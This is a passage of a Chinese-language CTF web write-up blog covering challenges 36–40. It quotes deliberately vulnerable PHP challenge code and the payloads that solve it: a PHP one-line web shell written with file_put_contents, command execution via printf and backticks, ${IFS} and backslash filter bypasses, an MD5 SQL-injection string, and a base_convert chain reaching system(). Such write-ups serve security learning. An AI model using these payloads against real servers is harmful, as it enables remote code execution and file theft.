class=\"line\">_=file_put_contents(&#x27;zoe.php&#x27;,&#x27;&lt;?php eval($_POST[zoe]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure>\n<p>然后蚁剑连上就行</p>\n<h2 id=\"36uuctf-2022-新生赛ez_rce\"><a class=\"markdownIt-Anchor\" href=\"#36uuctf-2022-新生赛ez_rce\">#</a> 36.[UUCTF 2022 新生赛] ez_rce</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$code</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\\$|\\*|\\+|\\^|scan|\\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>, <span class=\"variable\">$code</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;看看你输入的参数！！！不叫样子！！&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$code</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;你想干什么？？？？？？？？？&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;居然都不输入参数，可恶!!!!!!!!!&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一开始看题目标签无参 rce, 我还在想着异或取反自增，发现 $ 被过滤了，看了 wp 才发现 printf 这个函数也能这么 NB</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?code=printf(`l\\s /`);</span><br><span class=\"line\">?code=printf(`c\\at /fffffffffflagafag`);</span><br></pre></td></tr></table></figure>\n<h2 id=\"37hnctf-2022-week1easy_html\"><a class=\"markdownIt-Anchor\" href=\"#37hnctf-2022-week1easy_html\">#</a> 37.[HNCTF 2022 Week1]easy_html</h2>\n<p>F12 &gt; 网络 -&gt; 请求头</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hint:select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure>\n<p>传个特殊的:ffifdyop<br>\n 进入下一关，他说仔细想想在哪里找线索，直接查看源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$x</span>= <span class=\"variable\">$GET</span>[<span class=\"string\">&#x27;x&#x27;</span>];</span><br><span class=\"line\"><span class=\"variable\">$y</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;y&#x27;</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"variable\">$x</span> != <span class=\"variable\">$y</span> &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$x</span>) == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$y</span>))&#123;</span><br><span class=\"line\">;</span><br></pre></td></tr></table></figure>\n<p>弱类型数组绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?x[]=1&amp;y[]=2</span><br></pre></td></tr></table></figure>\n<p>然后下一关</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&quot;flag.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>] !== <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>] &amp;&amp; <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;wqh&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;dsy&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$FLAG</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>简单的强比较直接数组绕过</p>\n<h2 id=\"38wustctf-2020朴实无华\"><a class=\"markdownIt-Anchor\" href=\"#38wustctf-2020朴实无华\">#</a> 38.[WUSTCTF 2020] 朴实无华</h2>\n<p>首先提示人间极乐 bot<br>\n 访问 robots.txt, 进入提示的文件在在请求头中找到 /fl4g</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$num</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;num&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span>) &lt; <span class=\"number\">2020</span> &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$num</span> + <span class=\"number\">1</span>) &gt; <span class=\"number\">2021</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//level 2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$md5</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;md5&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$md5</span> == <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$md5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//get flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$get_flag</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;get_flag&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">strstr</span>(<span class=\"variable\">$get_flag</span>, <span class=\"string\">&quot; &quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$get_flag</span> = <span class=\"title function_ invoke__\">str_ireplace</span>(<span class=\"string\">&quot;cat&quot;</span>, <span class=\"string\">&quot;wctf2020&quot;</span>, <span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$get_flag</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;快到非洲了&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;去非洲吧&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第一关，尝试绕过 intval 函数<br>\n不加 1 的情况下，1e10 被认为是字符串，intval (“1e10”) 就是 1<br>\n 然后 &quot;1e10&quot;+1,&quot;1e10&quot; 会被转换成整数，就是 1*10 的 10 次方再加 1</p>\n<p>第二关:<br>\n 要求找一个 md 加密前后都是 0e 开头的数字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0e215962017</span><br></pre></td></tr></table></figure>\n<p>第三关:<br>\n 过滤了空格，cat<br>\n 空格用 ${IFS} 代替，cat 用 <code>c\\at</code>  代替</p>\n<h2 id=\"39ciscn-2019初赛love-math\"><a class=\"markdownIt-Anchor\" href=\"#39ciscn-2019初赛love-math\">#</a> 39.[CISCN 2019 初赛] Love Math</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//例子 c=20-1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$content</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$content</span>) &gt;= <span class=\"number\">80</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;太长了不会算&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$blacklist</span> = [<span class=\"string\">&#x27; &#x27;</span>, <span class=\"string\">&#x27;\\t&#x27;</span>, <span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\n&#x27;</span>, <span class=\"string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"string\">&#x27;&quot;&#x27;</span>, <span class=\"string\">&#x27;`&#x27;</span>, <span class=\"string\">&#x27;\\[&#x27;</span>, <span class=\"string\">&#x27;\\]&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$blacklist</span> <span class=\"keyword\">as</span> <span class=\"variable\">$blackitem</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$blackitem</span> . <span class=\"string\">&#x27;/m&#x27;</span>, <span class=\"variable\">$content</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$whitelist</span> = [<span class=\"string\">&#x27;abs&#x27;</span>, <span class=\"string\">&#x27;acos&#x27;</span>, <span class=\"string\">&#x27;acosh&#x27;</span>, <span class=\"string\">&#x27;asin&#x27;</span>, <span class=\"string\">&#x27;asinh&#x27;</span>, <span class=\"string\">&#x27;atan2&#x27;</span>, <span class=\"string\">&#x27;atan&#x27;</span>, <span class=\"string\">&#x27;atanh&#x27;</span>, <span class=\"string\">&#x27;base_convert&#x27;</span>, <span class=\"string\">&#x27;bindec&#x27;</span>, <span class=\"string\">&#x27;ceil&#x27;</span>, <span class=\"string\">&#x27;cos&#x27;</span>, <span class=\"string\">&#x27;cosh&#x27;</span>, <span class=\"string\">&#x27;decbin&#x27;</span>, <span class=\"string\">&#x27;dechex&#x27;</span>, <span class=\"string\">&#x27;decoct&#x27;</span>, <span class=\"string\">&#x27;deg2rad&#x27;</span>, <span class=\"string\">&#x27;exp&#x27;</span>, <span class=\"string\">&#x27;expm1&#x27;</span>, <span class=\"string\">&#x27;floor&#x27;</span>, <span class=\"string\">&#x27;fmod&#x27;</span>, <span class=\"string\">&#x27;getrandmax&#x27;</span>, <span class=\"string\">&#x27;hexdec&#x27;</span>, <span class=\"string\">&#x27;hypot&#x27;</span>, <span class=\"string\">&#x27;is_finite&#x27;</span>, <span class=\"string\">&#x27;is_infinite&#x27;</span>, <span class=\"string\">&#x27;is_nan&#x27;</span>, <span class=\"string\">&#x27;lcg_value&#x27;</span>, <span class=\"string\">&#x27;log10&#x27;</span>, <span class=\"string\">&#x27;log1p&#x27;</span>, <span class=\"string\">&#x27;log&#x27;</span>, <span class=\"string\">&#x27;max&#x27;</span>, <span class=\"string\">&#x27;min&#x27;</span>, <span class=\"string\">&#x27;mt_getrandmax&#x27;</span>, <span class=\"string\">&#x27;mt_rand&#x27;</span>, <span class=\"string\">&#x27;mt_srand&#x27;</span>, <span class=\"string\">&#x27;octdec&#x27;</span>, <span class=\"string\">&#x27;pi&#x27;</span>, <span class=\"string\">&#x27;pow&#x27;</span>, <span class=\"string\">&#x27;rad2deg&#x27;</span>, <span class=\"string\">&#x27;rand&#x27;</span>, <span class=\"string\">&#x27;round&#x27;</span>, <span class=\"string\">&#x27;sin&#x27;</span>, <span class=\"string\">&#x27;sinh&#x27;</span>, <span class=\"string\">&#x27;sqrt&#x27;</span>, <span class=\"string\">&#x27;srand&#x27;</span>, <span class=\"string\">&#x27;tan&#x27;</span>, <span class=\"string\">&#x27;tanh&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">preg_match_all</span>(<span class=\"string\">&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;</span>, <span class=\"variable\">$content</span>, <span class=\"variable\">$used_funcs</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$used_funcs</span>[<span class=\"number\">0</span>] <span class=\"keyword\">as</span> <span class=\"variable\">$func</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$func</span>, <span class=\"variable\">$whitelist</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//帮你算出答案</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">eval</span>(<span class=\"string\">&#x27;echo &#x27;</span> . <span class=\"variable\">$content</span> . <span class=\"string\">&#x27;;&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>计算器功能，一个白名单，可以用一些函数，其他字母都会被过滤，还有一个黑名单过滤了很多东西，长度 &lt;=80<br>\n 这里学习一个函数 base_convert ()<br>\n 具体用法看这里<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudzNzY2hvb2wuY29tLmNuL3BocC9mdW5jX21hdGhfYmFzZV9jb252ZXJ0LmFzcA==\">函数语法</span><br>\n这里构造的高进制数字会当作字符串处理，而不是当作数字处理<br>\n这里我们要构造_GET<br>\n 介绍两个函数:<br>\ndechex () 将十进制转换成 16 进制<br>\n hex2bin (): 将 16 进制转换为 ASCII 码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[]被黑名单过滤可以用&#123;&#125;替代</span><br><span class=\"line\">_GET可以用hex2bin转换,_GET的16进制是5f 47 45 54</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)</span><br><span class=\"line\">但是hex2bin是白名单以外的函数,可用base_convert的高进制转换为字符串,即:</span><br><span class=\"line\">hex2bin=base_convert(37907361743,10,36)</span><br><span class=\"line\">还有:</span><br><span class=\"line\">5f 47 45 54也不能直接填,会被匹配当作函数名放进白名单中检查</span><br><span class=\"line\">5f474554=dechex(1598506324)</span><br><span class=\"line\">因此:</span><br><span class=\"line\">_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));($$cos)&#123;1&#125;(($$cos)&#123;2&#125;)&amp;1=system&amp;2=cat /flag</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"40hnctf-2022-week2easy_include\"><a class=\"markdownIt-Anchor\" href=\"#40hnctf-2022-week2easy_include\">#</a> 40.[HNCTF 2022 WEEK2]easy_include</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//WEB手要懂得搜索</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$file</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;file&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i&quot;</span>, <span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>data 协议不能用，file 